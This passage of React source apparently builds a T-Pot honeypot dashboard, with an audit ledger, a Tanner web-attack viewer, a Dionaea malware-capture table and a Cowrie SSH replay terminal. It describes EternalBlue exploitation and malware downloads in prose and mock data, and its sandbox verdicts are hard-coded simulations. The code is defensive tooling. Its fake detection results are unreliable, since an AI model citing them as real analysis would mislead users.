                                            `Generated on: ${new Date().toUTCString()}\n` +
                                            `Security Rating: HIGH COMPLIANCE SECURED\n` +
                                            `Operator Privilege Context: SECURE AUDITOR (READ-ONLY)\n\n` +
                                            `AUDIT TRACK LEDGER:\n` +
                                            `------------------------------------------------------------------------\n` +
                                            auditLogs.map(log => 
                                              `[${log.time}] | Actor: ${log.actor.padEnd(10)} | Action: ${log.action.padEnd(45)} | Target: ${log.target.padEnd(25)} | Result: ${log.result.padEnd(8)} | Severity: ${log.severity}`
                                            ).join("\n") +
                                            `\n\n------------------------------------------------------------------------\n` +
                                            `End of Audit Ledger. Issued by immutable T-Pot ELK Hook.\n` +
                                            `========================================================================\n`;
                      
                      const element = document.createElement("a");
                      const file = new Blob([reportContent], { type: 'text/plain' });
                      element.href = URL.createObjectURL(file);
                      element.download = "t-pot-compliance-audit-report.pdf";
                      document.body.appendChild(element);
                      element.click();
                      document.body.removeChild(element);
                    }}
                    className="px-4 py-2 bg-gradient-to-r from-yellow-500 to-amber-500 hover:from-yellow-400 hover:to-amber-400 text-gray-950 text-xs font-black rounded-xl flex items-center gap-1.5 cursor-pointer shadow-lg shadow-yellow-500/10 transition-all font-mono"
                  >
                    <Download size={13} />
                    <span>{getLoc('audit_export_pdf')}</span>
                  </button>
                </div>

                {/* Audit logs list filter search */}
                <div className="mb-4">
                  <input
                    type="text"
                    placeholder="篩選特權執行人員或敏感行為..."
                    onChange={(e) => {
                      const term = e.target.value.toLowerCase();
                      if (!term) {
                        setAuditLogs([
                          { id: 'AUD-001', time: '11:00:00', actor: 'Analyst C', action: 'Block IP 185.195.233.102', target: 'Fortinet API Server', result: 'Success', severity: 'High' },
                          { id: 'AUD-002', time: '10:00:00', actor: 'Admin A', action: 'Restart docker container Cowrie', target: 'Docker API', result: 'Success', severity: 'Critical' },
                          { id: 'AUD-003', time: '09:30:15', actor: 'Admin A', action: 'Update Splunk Webhook endpoint settings', target: 'SIEM Sync Core', result: 'Success', severity: 'Medium' },
                          { id: 'AUD-004', time: '09:12:40', actor: 'Analyst B', action: 'Download malware payload mirai.x86_downloader', target: 'Database Sandbox', result: 'Success', severity: 'Low' },
                          { id: 'AUD-005', time: '08:45:10', actor: 'Admin A', action: 'Register physical node: SENSOR-AFRICA', target: 'Kibana Cluster Sync', result: 'Success', severity: 'High' }
                        ]);
                      } else {
                        setAuditLogs(prev => prev.filter(x => 
                          x.actor.toLowerCase().includes(term) || 
                          x.action.toLowerCase().includes(term) ||
                          x.target.toLowerCase().includes(term)
                        ));
                      }
                    }}
                    className="w-full max-w-md px-3.5 py-1.5 bg-black border border-gray-850 hover:border-gray-850 focus:border-yellow-400/50 rounded-xl text-xs text-white outline-none transition-all"
                  />
                </div>

                {/* Render Audit table ledger */}
                <div className="overflow-x-auto rounded-xl border border-gray-850">
                  <table className="w-full text-left text-xs text-gray-300">
                    <thead className="bg-[#10141f] border-b border-gray-800 text-gray-400 font-bold uppercase text-[10px] tracking-wider font-mono">
                      <tr>
                        <th className="p-4">{getLoc('audit_table_time')}</th>
                        <th className="p-4">{getLoc('audit_table_actor')}</th>
                        <th className="p-4">{getLoc('audit_table_action')}</th>
                        <th className="p-4">{getLoc('audit_table_target')}</th>
                        <th className="p-4">{getLoc('audit_table_result')}</th>
                        <th className="p-4 text-center">{getLoc('audit_table_severity')}</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-gray-850 font-mono text-[11px]">
                      {auditLogs.map((item) => (
                        <tr key={item.id} className="hover:bg-gray-900/30 transition-colors">
                          <td className="p-4 text-gray-500 font-black">{item.time}</td>
                          <td className="p-4">
                            <span className="text-white font-bold flex items-center gap-1.5">
                              <span className="w-1.5 h-1.5 rounded-full bg-indigo-400"></span>
                              {item.actor}
                            </span>
                          </td>
                          <td className="p-4 text-gray-200 font-semibold">{item.action}</td>
                          <td className="p-4 text-gray-400 select-all">{item.target}</td>
                          <td className="p-4 text-emerald-400 font-black">{item.result}</td>
                          <td className="p-4 text-center">
                            <span className={cn(
                              "text-[9px] font-bold px-2 py-0.5 rounded border uppercase",
                              item.severity === 'Critical' && "bg-red-500/10 text-red-500 border-red-500/20",
                              item.severity === 'High' && "bg-orange-500/10 text-orange-400 border-orange-500/20",
                              item.severity === 'Medium' && "bg-blue-500/10 text-blue-400 border-blue-500/20",
                              item.severity === 'Low' && "bg-gray-500/10 text-gray-400 border-gray-500/20"
                            )}>
                              {item.severity}
                            </span>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>

              </div>

            </div>
          )}

          {/* TAB SPECIALIST ANALYSIS: TANNER, DIONAEA, COWRIE DEEP-DIVE forensicing */}
          {activeTab === 'analysis' && (
            <div className="space-y-6 animate-fadeIn">
              
              {/* Header banner with descriptive focus */}
              <div className="bg-[#0c0f16] border border-gray-850 rounded-2xl p-6 relative overflow-hidden">
                <div className="absolute top-0 right-0 w-80 h-80 bg-[#FF3366]/5 rounded-full blur-3xl pointer-events-none"></div>
                <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                  <div>
                    <h2 className="text-lg font-black tracking-widest text-white uppercase font-mono flex items-center gap-2">
                      <Layers className="text-[#FF3366] animate-pulse" size={18} />
                      {getLoc('analysis_header_title')}
                    </h2>
                    <p className="text-xs text-gray-400 mt-1 max-w-3xl font-mono">
                      {getLoc('analysis_header_desc')}
                    </p>
                  </div>
                  <div className="flex items-center gap-2 bg-black/40 p-2.5 rounded-xl border border-gray-850">
                    <span className="text-[10px] uppercase font-black font-mono text-gray-500">探針集群狀態:</span>
                    <span className="px-2 py-0.5 rounded-md bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-[10px] font-black uppercase font-mono animate-pulse">
                      ● Active Deception
                    </span>
                  </div>
                </div>

                {/* Subtab selection selector buttons */}
                <div className="flex flex-wrap gap-2.5 mt-6 border-t border-gray-900 pt-5">
                  <button
                    onClick={() => setAnalysisSubTab('tanner')}
                    className={cn(
                      "px-4 py-2.5 rounded-xl text-xs font-black transition-all cursor-pointer flex items-center gap-2 font-mono border",
                      analysisSubTab === 'tanner'
                        ? "bg-[#FF3366]/15 border-[#FF3366]/40 text-[#FF3366] shadow-lg shadow-[#FF3366]/5"
                        : "bg-black/40 border-gray-850 text-gray-400 hover:text-white hover:bg-gray-900"
                    )}
                  >
                    🕸️ Tanner Web 攻撃分析 (Web Exploit)
                  </button>

                  <button
                    onClick={() => setAnalysisSubTab('dionaea')}
                    className={cn(
                      "px-4 py-2.5 rounded-xl text-xs font-black transition-all cursor-pointer flex items-center gap-2 font-mono border",
                      analysisSubTab === 'dionaea'
                        ? "bg-blue-500/15 border-blue-500/40 text-blue-400 shadow-lg shadow-blue-500/5"
                        : "bg-black/40 border-gray-850 text-gray-400 hover:text-white hover:bg-gray-900"
                    )}
                  >
                    🐛 Dionaea 漏洞與樣本 (Malware Sandbox)
                  </button>

                  <button
                    onClick={() => setAnalysisSubTab('cowrie')}
                    className={cn(
                      "px-4 py-2.5 rounded-xl text-xs font-black transition-all cursor-pointer flex items-center gap-2 font-mono border",
                      analysisSubTab === 'cowrie'
                        ? "bg-yellow-500/15 border-yellow-500/40 text-yellow-400 shadow-lg shadow-yellow-500/5"
                        : "bg-black/40 border-gray-850 text-gray-400 hover:text-white hover:bg-gray-900"
                    )}
                  >
                    💻 Cowrie SSH/Telnet 即時回放 (Terminal Replay)
                  </button>
                </div>
              </div>

              {/* VIEW 1: TANNER WEB ATTACK ANALYZER */}
              {analysisSubTab === 'tanner' && (
                <div className="space-y-6 animate-fadeIn">
                  
                  {/* Warning brief */}
                  <div className="bg-red-500/10 border border-red-500/20 rounded-2xl p-4 flex items-center justify-between gap-4">
                    <div className="flex items-center gap-2.5">
                      <AlertTriangle className="text-[#FF3366] w-4.5 h-4.5 animate-pulse flex-shrink-0" />
                      <div>
                        <span className="text-xs font-black text-rose-300 block">Tanner 網頁防火牆沙盒誘捕中</span>
                        <span className="text-[10px] text-gray-400 font-mono mt-0.5 block">
                          此蜜罐模擬了複雜的 Windows IIS、Nginx 代理與 WordPress 目錄，自動抓取 SQLi 盲注、Log4j、NoSQL 及 Remote Shell 等 OWASP 十大威脅惡意流。
                        </span>
                      </div>
                    </div>
                  </div>

                  {/* Complex diagnostic grid */}
                  <div className="grid grid-cols-1 xl:grid-cols-3 gap-6">
                    
                    {/* Log queue list */}
                    <div className="bg-[#0d1017] border border-gray-850 rounded-2xl p-5 space-y-4">
                      <div className="border-b border-gray-900 pb-3 flex items-center justify-between">
                        <span className="text-xs font-black text-white uppercase tracking-wider font-mono">Tanner 威脅攻擊請求隊列</span>
                        <span className="text-[9px] bg-red-500/20 text-red-400 font-black px-1.5 py-0.5 rounded">實時擷取</span>
                      </div>

                      <div className="space-y-2.5 max-h-[460px] overflow-y-auto pr-1">
                        {tannerRequests.map(req => (
                          <div
                            key={req.id}
                            onClick={() => setSelectedTannerReq(req)}
                            className={cn(
                              "p-3.5 rounded-xl border transition-all cursor-pointer text-left relative",
                              selectedTannerReq.id === req.id
                                ? "bg-black border-[#FF3366]/40 shadow-lg"
                                : "bg-black/40 border-gray-900 hover:border-gray-800"
                            )}
                          >
                            {selectedTannerReq.id === req.id && (
                              <span className="absolute left-0 top-3.5 bottom-3.5 w-1 bg-[#FF3366] rounded-r-full"></span>
                            )}
                            <div className="flex items-center justify-between gap-2">
                              <span className={cn(
                                "text-[9px] font-black font-mono px-2 py-0.5 rounded",
                                req.method === 'POST' ? "bg-amber-500/10 text-amber-500 border border-amber-500/20" : "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20"
                              )}>
                                {req.method}
                              </span>
                              <span className="text-[10px] text-gray-500 font-mono font-bold">{req.timestamp}</span>
                            </div>
                            <div className="text-[11px] font-bold text-white mt-2 truncate font-mono">{req.url}</div>
                            <div className="flex items-center justify-between mt-2 pt-2 border-t border-gray-900">
                              <span className="text-[10px] font-mono text-[#FF3366] font-bold">{req.vulnerability}</span>
                              <span className="text-[9px] text-gray-500 font-mono">{req.clientIp}</span>
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>

                    {/* HTTP request reconstructed Postman-view */}
                    <div className="bg-[#0d1017] border border-gray-[#FF3366]/10 border-gray-850 rounded-2xl p-5 xl:col-span-1 space-y-4">
                      <div className="border-b border-gray-900 pb-3 flex items-center gap-2">
                        <Binary className="text-[#FF3366]" size={14} />
                        <span className="text-xs font-black text-white uppercase tracking-wider font-mono">HTTP Request Reconstructor (請求模擬重建)</span>
                      </div>

                      {/* Header bar */}
                      <div className="bg-black border border-gray-850 rounded-xl p-3 flex items-center gap-2 font-mono text-xs">
                        <span className={cn(
                          "px-2 py-1 rounded font-black",
                          selectedTannerReq.method === 'POST' ? "bg-amber-500/20 text-amber-500" : "bg-emerald-500/20 text-emerald-400"
                        )}>
                          {selectedTannerReq.method}
                        </span>
                        <span className="text-white font-bold select-all truncate">{selectedTannerReq.url}</span>
                      </div>

                      {/* Headers metadata block */}
                      <div className="space-y-2">
                        <span className="text-[9px] uppercase font-black text-gray-500 tracking-wider font-mono block">HTTP Host Headers</span>
                        <div className="bg-black/60 rounded-xl p-3 border border-gray-900 space-y-1.5 font-mono text-[10px] select-all max-h-[160px] overflow-y-auto">
                          {Object.entries(selectedTannerReq.headers).map(([key, val]) => (
                            <div key={key} className="flex items-start gap-1 pb-1 border-b border-transparent hover:border-gray-900">
                              <span className="text-gray-400 font-bold flex-shrink-0">{key}:</span>
                              <span className="text-[#10B981] break-all">{val}</span>
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* Decoded application payload body */}
                      <div className="space-y-2">
                        <div className="flex items-center justify-between">
                          <span className="text-[9px] uppercase font-black text-gray-500 tracking-wider font-mono">Decoded Trigger Payload Body</span>
                          <span className="text-[8px] bg-indigo-500/10 text-indigo-400 font-mono px-1">Raw Payload</span>
                        </div>
                        <div className="bg-black/95 rounded-xl p-3 border border-gray-900 font-mono text-[11px] text-red-400 select-all overflow-x-auto whitespace-pre leading-relaxed min-h-[100px] border-l-2 border-l-[#FF3366]">
                          {selectedTannerReq.payload}
                        </div>
                      </div>

                      <div className="flex justify-end pt-2 border-t border-gray-900 gap-2">
                        <button
                          onClick={() => {
                            navigator.clipboard.writeText(JSON.stringify(selectedTannerReq, null, 2));
                            showToast('已複製 Tanner 原始 JSON 安全事件結構', 'success');
                          }}
                          className="px-3.5 py-1.5 bg-gray-900 border border-gray-800 hover:bg-gray-850 hover:text-white rounded-lg text-[10px] font-bold font-mono transition-all cursor-pointer text-gray-400"
                        >
                          複製原始 JSON
                        </button>
                        <button
                          onClick={() => {
                            handleBlockAddress(selectedTannerReq.clientIp);
                          }}
                          className="px-3.5 py-1.5 bg-rose-600/10 text-rose-400 border border-rose-500/20 hover:bg-rose-500/20 rounded-lg text-[10px] font-bold font-mono transition-all cursor-pointer"
                        >
                          立即封鎖來源 IP
                        </button>
                      </div>
                    </div>

                    {/* Threat tags cloud & Recharts Pie chart */}
                    <div className="space-y-6">
                      
                      {/* Pie chart card */}
                      <div className="bg-[#0d1017] border border-gray-850 rounded-2xl p-5 text-center">
                        <span className="text-xs font-black text-white uppercase tracking-wider font-mono block mb-4 text-left border-b border-gray-900 pb-2">
                          OWASP Top-10 漏洞識別分佈率
                        </span>
                        
                        <div className="flex justify-center items-center h-40">
                          <ResponsiveContainer width="100%" height="100%">
                            <PieChart>
                              <Pie
                                data={tannerStatsData}
                                cx="50%"
                                cy="50%"
                                innerRadius={42}
                                outerRadius={58}
                                paddingAngle={3}
                                dataKey="value"
                              >
                                {tannerStatsData.map((entry, index) => (
                                  <Cell key={`cell-${index}`} fill={VULN_COLORS[index % VULN_COLORS.length]} />
                                ))}
                              </Pie>
                              <Tooltip contentStyle={{ backgroundColor: '#07090e', borderColor: '#374151', borderRadius: '8px', fontSize: '10px' }} />
                            </PieChart>
                          </ResponsiveContainer>
                        </div>

                        {/* Distribution legends */}
                        <div className="grid grid-cols-2 gap-2 mt-2 text-left font-mono text-[9px]">
                          {tannerStatsData.map((entry, idx) => (
                            <div key={entry.name} className="flex items-center gap-1">
                              <span className="w-1.5 h-1.5 rounded-full" style={{ backgroundColor: VULN_COLORS[idx] }}></span>
                              <span className="text-gray-400 truncate">{entry.name}:</span>
                              <span className="text-white font-bold">{entry.value}%</span>
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* Scanner source tag cloud */}
                      <div className="bg-[#0d1017] border border-gray-850 rounded-2xl p-5">
                        <span className="text-xs font-black text-white uppercase tracking-wider font-mono block mb-3 border-b border-gray-900 pb-2">
                          自動化探針/掃描器辨識特徵庫
                        </span>
                        <p className="text-[10px] text-gray-500 font-mono mb-4 leading-relaxed">
                          Tanner 自動比對 HTTP headers 的 User-Agent 特徵與隨機探測指紋，已識別以下掃描器核心發起源：
                        </p>
                        
                        <div className="flex flex-wrap gap-2">
                          {[
                            { name: 'Acunetix Web Vulnerability', count: 421, color: 'text-rose-400 bg-rose-500/10 border-rose-500/25' },
                            { name: 'Nikto Scanner', count: 184, color: 'text-amber-400 bg-amber-500/10 border-amber-500/25' },
                            { name: 'SQLMap Automater', count: 305, color: 'text-yellow-400 bg-yellow-500/10 border-yellow-500/25' },
                            { name: 'Nmap Scanning Engine', count: 684, color: 'text-blue-400 bg-blue-500/10 border-blue-500/25' },
                            { name: 'Dirbuster Directory Search', count: 512, color: 'text-indigo-400 bg-indigo-500/10 border-indigo-500/25' },
                            { name: 'Nuclei Exploit Engine', count: 911, color: 'text-purple-400 bg-purple-500/10 border-purple-500/25' }
                          ].map(tag => (
                            <div
                              key={tag.name}
                              onClick={() => showToast(`特徵比對：本日已被 ${tag.name} 分散探測試圖 ${tag.count} 次。過濾器已自動阻絕。`, 'info')}
                              className={cn(
                                "px-2.5 py-1 rounded-xl text-[9px] font-bold font-mono border cursor-pointer hover:scale-105 transition-all flex items-center gap-1.5",
                                tag.color
                              )}
                            >
                              <span>{tag.name}</span>
                              <strong className="opacity-80 bg-black/60 px-1 py-0.2 rounded text-[8px] font-black">{tag.count} IPS</strong>
                            </div>
                          ))}
                        </div>
                      </div>

                    </div>

                  </div>

                </div>
              )}

              {/* VIEW 2: DIONAEA THREAT SYSTEM ANALYZER */}
              {analysisSubTab === 'dionaea' && (
                <div className="space-y-6 animate-fadeIn">
                  
                  {/* Warning banner */}
                  <div className="bg-blue-500/10 border border-blue-500/20 rounded-2xl p-4 flex items-center justify-between gap-4">
                    <div className="flex items-center gap-2.5">
                      <Cpu className="text-blue-400 w-4.5 h-4.5 animate-pulse flex-shrink-0" />
                      <div>
                        <span className="text-xs font-black text-blue-300 block">Dionaea 多通訊埠漏洞捕獲進程運作中</span>
                        <span className="text-[10px] text-gray-400 font-mono mt-0.5 block">
                          整合病毒溢位探針，開放在線 445/SMB, 3306/MySQL 等虛擬主機監聽。當黑客發送惡意 Shellcode 或惡意二進制下載命令時，自動組合成 PE/ELF 檔案並保存雜湊。
                        </span>
                      </div>
                    </div>
                  </div>

                  {/* Operational diagnostics grid */}
                  <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                    
                    {/* Targeted service breakdown & Flow pipeline */}
                    <div className="lg:col-span-1 space-y-6">
                      
                      {/* Services list with meter */}
                      <div className="bg-[#0d1017] border border-gray-850 rounded-2xl p-5">
                        <span className="text-xs font-black text-white uppercase tracking-wider font-mono block mb-4 border-b border-gray-900 pb-2">
                          Dionaea 誘餌漏洞服務偵聽排行 (Targeted Services)
                        </span>

                        <div className="space-y-4">
                          {[
                            { port: 'Port 445 (SMB MS17-010 / EternalBlue)', percent: 74, color: 'bg-red-500' },
                            { port: 'Port 3306 (MySQL Injection & UDF hijacking)', percent: 12, color: 'bg-amber-500' },
                            { port: 'Port 1433 (MSSQL Command Dropper)', percent: 9, color: 'bg-indigo-500' },
                            { port: 'Port 11211 (Memcached Remote exploit)', percent: 5, color: 'bg-purple-500' }
                          ].map(svc => (
                            <div key={svc.port} className="space-y-1">
                              <div className="flex justify-between items-center text-[10px] font-mono">
                                <span className="text-gray-300 font-bold">{svc.port}</span>
                                <span className="text-white font-black">{svc.percent}%</span>
                              </div>
                              <div className="w-full h-2 bg-black rounded-full overflow-hidden border border-gray-900">
                                <div
                                  className={cn("h-full rounded-full transition-all duration-1000", svc.color)}
                                  style={{ width: `${svc.percent}%` }}
                                />
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* Visualized Malware pipeline tracker flow */}
                      <div className="bg-[#0d1017] border border-gray-850 rounded-2xl p-5">
                        <span className="text-xs font-black text-white uppercase tracking-wider font-mono block mb-4 border-b border-gray-900 pb-2">
                          Active Malware Capture Pipeline (惡意樣本補獲工作鏈)
                        </span>
                        
                        <div className="space-y-3.5 relative">
                          {/* Left thin connector accent lines */}
                          <div className="absolute left-3.5 top-5 bottom-5 w-px bg-dashed bg-gradient-to-b from-blue-500 via-amber-500 to-emerald-500 opacity-35" />

                          {[
                            { step: '1. 來源威脅主機入侵探測', desc: '攻擊者針對 445/SMB 發送 EternalBlue shellcode 緩衝區溢位命令串。', color: 'border-blue-500/25 text-blue-400 bg-blue-500/5' },
                            { step: '2. 溢位解碼與 Payload 擷取', desc: 'Dionaea 阻隔真實執行，自動抽取記憶體記憶體位元組流下載連結 (Wget payload)。', color: 'border-amber-500/25 text-amber-400 bg-amber-500/5' },
                            { step: '3. 二進位二進制自體重裝', desc: '後台靜默同步把惡意勒索軟體 (payload.exe) 下載回蜜罐沙箱資料夾並編譯雜湊。', color: 'border-emerald-500/25 text-emerald-400 bg-emerald-500/5' }
                          ].map((item, index) => (
                            <div key={index} className={cn("p-3 rounded-xl border relative pl-7 font-mono text-[10px]", item.color)}>
                              <span className="absolute left-2.5 top-3 w-2 h-2 rounded-full bg-current block animate-ping" />
                              <strong className="block text-white mb-0.5">{item.step}</strong>
                              <p className="text-gray-400 leading-normal">{item.desc}</p>
                            </div>
                          ))}
                        </div>
                      </div>

                    </div>

                    {/* Captured list & sandbox execution playground */}
                    <div className="lg:col-span-2 space-y-6">
                      
                      {/* Table card */}
                      <div className="bg-[#0d1017] border border-gray-850 rounded-2xl p-5">
                        <span className="text-xs font-black text-white uppercase tracking-wider font-mono block mb-4 border-b border-gray-900 pb-2">
                          Dionaea 近期補獲之惡意程式庫 (Malware Logs Ledger)
                        </span>

                        <div className="overflow-x-auto rounded-xl border border-gray-900 bg-black/60">
                          <table className="w-full text-left text-[11px] font-mono text-gray-300">
                            <thead className="bg-[#10141f] border-b border-gray-900 text-gray-500 uppercase text-[9px] tracking-wider font-black">
                              <tr>
                                <th className="p-3.5">時間時間</th>
                                <th className="p-3.5">捕獲通訊埠</th>
                                <th className="p-3.5">惡意二進制名</th>
                                <th className="p-3.5">SHA-256 雜湊碼值</th>
                                <th className="p-3.5 text-center">沙箱鑑定</th>
                              </tr>
                            </thead>
                            <tbody className="divide-y divide-gray-900">
                              {dionaeaCaptures.map(cap => (
                                <tr key={cap.id} className="hover:bg-gray-900/20 transition-colors">
                                  <td className="p-3.5 text-gray-500 font-bold">{cap.timestamp}</td>
                                  <td className="p-3.5 text-white font-bold">{cap.port}</td>
                                  <td className="p-3.5 text-blue-400 font-black">{cap.filename}</td>
                                  <td className="p-3.5 text-gray-500 font-medium select-all">
                                    {cap.sha256.slice(0, 10)}...{cap.sha256.slice(-8)}
                                  </td>
                                  <td className="p-3.5 text-center">
                                    {cap.sandboxStatus === 'none' && (
                                      <button
                                        onClick={() => {
                                          showToast(`Cuckoo: 正在解構二進位頭, 傳送 ${cap.filename} 至安全動態分析沙箱!`, 'info');
                                          setDionaeaCaptures(prev => prev.map(x => x.id === cap.id ? { ...x, sandboxStatus: 'analyzing' } : x));
                                          
                                          // Simulate sandbox analysis timeout
                                          setTimeout(() => {
                                            setDionaeaCaptures(prev => prev.map(x => x.id === cap.id ? { 
                                              ...x, 
                                              sandboxStatus: 'complete', 
                                              threatScore: 98, 
                                              description: 'Active Wannacry Ransomware Variant found. Extracted target Bitcoin receiver Address.' 
                                            } : x));
                                            showToast(`🚨【沙盒檢測回報】確認樣本 '${cap.filename}' 具極高勒索軟體危害！黑客對接鏈為 CVE-2017-0144`, 'danger');
                                            
                                            // Append to audit logs of sandbox analysis
                                            const newAudit: AuditLogItem = {
                                              id: `AUD-${Date.now().toString().slice(-3)}`,
                                              time: new Date().toTimeString().split(' ')[0],
                                              actor: 'Cuckoo Sandbox Bot',
                                              action: `Exploded ${cap.filename}, parsed risk rating score: 98/100`,
                                              target: 'Dionaea Binary Vault',
                                              result: 'Danger Alert Triggered',
                                              severity: 'Critical'
                                            };
                                            setAuditLogs(prev => [newAudit, ...prev]);

                                          }, 2000);
                                        }}
                                        className="px-2 py-1 bg-blue-600 hover:bg-blue-500 text-white rounded text-[10px] font-black cursor-pointer transition-all"
                                      >
                                        傳送至沙箱分析
                                      </button>
                                    )}

                                    {cap.sandboxStatus === 'analyzing' && (
                                      <span className="flex items-center justify-center gap-1.5 text-amber-400 font-bold text-[10px]">
                                        <RefreshCw size={11} className="animate-spin text-amber-500" />
                                        沙盒動態反彙編中...
                                      </span>
                                    )}

                                    {cap.sandboxStatus === 'complete' && (
                                      <div className="flex flex-col items-center gap-0.5">
                                        <span className={cn(
                                          "px-2 py-0.5 rounded text-[9px] font-black uppercase text-center",
                                          cap.threatScore > 90 ? "bg-red-500/15 text-red-400 border border-red-500/30" : "bg-emerald-500/15 text-emerald-400"
                                        )}>
                                          威脅度 {cap.threatScore}/100
                                        </span>
                                      </div>
                                    )}
                                  </td>
                                </tr>
                              ))}
                            </tbody>
                          </table>
                        </div>
                      </div>

                      {/* Display results when sandboxing is complete */}
                      {dionaeaCaptures.some(x => x.sandboxStatus === 'complete') && (
                        <motion.div
                          initial={{ opacity: 0, y: 10 }}
                          animate={{ opacity: 1, y: 0 }}
                          className="bg-black/40 border border-red-500/20 rounded-2xl p-5 space-y-4"
                        >
                          <div className="flex items-center gap-2 border-b border-gray-900 pb-2.5">
                            <span className="text-[14px]">🔬</span>
                            <span className="text-xs font-black text-rose-400 uppercase tracking-wider font-mono">
                              沙箱動態行為拆解報告 (Static PE Executable Forensics Report)
                            </span>
                          </div>

                          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 font-mono text-[10px]">
                            <div className="space-y-2">
                              <div>
                                <span className="text-gray-500 font-bold block">偵測核心漏洞指紋:</span>
                                <span className="text-white font-bold block mt-0.5">SMBv1 Remotely Vulnerability Exploitation (MS17-010)</span>
                              </div>
                              <div>
                                <span className="text-gray-500 font-bold block">捕獲虛擬行為觸發:</span>
                                <span className="text-[#FF3366] font-bold block mt-0.5">Attempted API Import: WriteProcessMemory, ShellExecuteW</span>
                              </div>
                            </div>
                            <div className="space-y-2">
                              <div>
                                <span className="text-gray-500 font-bold block">靜態反編譯特徵碼:</span>
                                <span className="text-white font-bold block mt-0.5">YARA: Win_Ransomware_WannaCry_Rule_A6</span>
                              </div>
                              <div>
                                <span className="text-gray-500 font-bold block">釋放的惡意行為詳情:</span>
                                <p className="text-gray-400 leading-relaxed mt-0.5">
                                  {dionaeaCaptures.find(x => x.sandboxStatus === 'complete')?.description || 'Trojan.Mirai payload with multi-stage socket binding capabilities.'}
                                </p>
                              </div>
                            </div>
                          </div>
                        </motion.div>
                      )}

                    </div>

                  </div>

                </div>
              )}

              {/* VIEW 3: COWRIE SHELL TERMINAL REPLAY */}
              {analysisSubTab === 'cowrie' && (
                <div className="space-y-6 animate-fadeIn">
                  
                  {/* Warning brief */}
                  <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-2xl p-4 flex items-center justify-between gap-4">
                    <div className="flex items-center gap-2.5">
                      <TerminalIcon className="text-yellow-400 w-4.5 h-4.5 animate-pulse flex-shrink-0" />
                      <div>
                        <span className="text-xs font-black text-yellow-300 block">Cowrie SSH/Telnet 完全互動終端蜜罐隔離中</span>
                        <span className="text-[10px] text-gray-400 font-mono mt-0.5 block">
                          提供高度欺敵 Linux Shell 界面。黑客使用暴力破解登入後，其一舉一動、輸入指令、wget 下載惡意 ELF 病毒之過程均會被 100% 同步錄影回放。
                        </span>
                      </div>
                    </div>
                  </div>

                  <div className="grid grid-cols-1 xl:grid-cols-3 gap-6">
                    
                    {/* Retro Interactive Terminal Window (cols 2) */}
                    <div className="xl:col-span-2 space-y-4">
                      
                      {/* Terminal main frame */}
                      <div className="bg-[#0b0c10] border border-gray-850 rounded-2xl overflow-hidden shadow-2xl relative">
                        
                        {/* macOS style header window panel */}
                        <div className="bg-gray-950 px-4 py-3 flex items-center justify-between border-b border-gray-900">
                          <div className="flex items-center gap-2">
                            <span className="w-2.5 h-2.5 rounded-full bg-red-500 block"></span>
                            <span className="w-2.5 h-2.5 rounded-full bg-yellow-500 block"></span>
                            <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 block"></span>
                            <span className="text-[10px] text-gray-500 font-mono font-bold ml-2">Cowrie Session Recording Replay: [IP: 103.44.122.5] • Active TTY-v1</span>
                          </div>
                          
                          <div className="flex items-center gap-1.5 font-mono text-[9px] text-[#FF3366]">
                            <span className="w-1.5 h-1.5 rounded-full bg-red-500 block animate-ping"></span>
                            <span>LIVE CAPTURING</span>
                          </div>
                        </div>

                        {/* Monospace terminal console */}
                        <div 
                          className="p-5 overflow-y-auto max-h-[400px] min-h-[350px] font-mono text-[11px] text-[#10B981] space-y-1.5 select-all leading-relaxed bg-[#050608]"
                        >
                          <div className="text-gray-500 pb-2">
                            -- TTP-Log Session Replay started. Waiting for hacker connection commands packet... --
                          </div>

                          {terminalLines.map((line, idx) => (
                            <div 
                              key={idx} 
                              className={cn(
                                line.startsWith('root@tpot-deception-node') ? "text-yellow-400 font-bold mt-2" : "text-emerald-400",
                                line.includes('[Cowrie ALERT') && "text-red-500 font-black animate-pulse"
                              )}
                            >
                              {line}
                            </div>
                          ))}

                          {terminalPlaying && currentCmdStep < cowrieTerminalScript.length && (
                            <div className="flex items-center gap-1 text-yellow-400 font-bold">
                              <span>root@tpot-deception-node:~#</span>
                              <span className="w-1.5 h-3 bg-yellow-400 block animate-pulse"></span>
                            </div>
                          )}
                        </div>

                        {/* Playing control bar directly below terminal */}
                        <div className="bg-gray-950 p-4 border-t border-gray-900 flex flex-wrap items-center justify-between gap-4 font-mono">
                          
                          {/* Play pause controls */}
                          <div className="flex items-center gap-3">
                            <button
                              onClick={() => {
                                setTerminalPlaying(!terminalPlaying);
                                showToast(!terminalPlaying ? '重新恢復黑客連線 TTY 錄影回放器' : '暫停終端會話錄影回放', 'info');
                              }}
                              className="px-4 py-2 bg-[#FF3366] hover:bg-[#FF3366]/90 text-white rounded-xl text-xs font-black cursor-pointer flex items-center gap-1.5 shadow-lg shadow-[#FF3366]/10"
                            >
                              {terminalPlaying ? <Pause size={13} /> : <Play size={13} />}
                              <span>{terminalPlaying ? '暫停播放 (Pause)' : '繼續播放 (Resume)'}</span>
                            </button>

                            <button
                              onClick={() => {
                                setTerminalLines([]);
                                setCurrentCmdStep(0);
                                setTerminalPlaying(true);
                                showToast('重設終端。黑客密碼握手模擬重新開始第一步驟', 'info');
                              }}
                              className="px-3 py-2 bg-gray-900 border border-gray-800 hover:bg-gray-850 hover:text-white rounded-xl text-xs font-bold text-gray-400 cursor-pointer"
                            >
                              🔁 重新回放
                            </button>
                          </div>

                          {/* Multiplication Speed Toggles */}
                          <div className="flex items-center gap-2.5">
                            <span className="text-[10px] font-black text-gray-500 uppercase">回放播放倍率:</span>
                            <div className="flex border border-gray-850 rounded-xl bg-black overflow-hidden">
                              {[1, 2, 5].map(speed => (
                                <button
                                  key={speed}
                                  onClick={() => {
                                    setPlaybackSpeed(speed);
                                    showToast(`會話播放速率已加速至 ${speed}x`, 'success');
                                  }}
                                  className={cn(
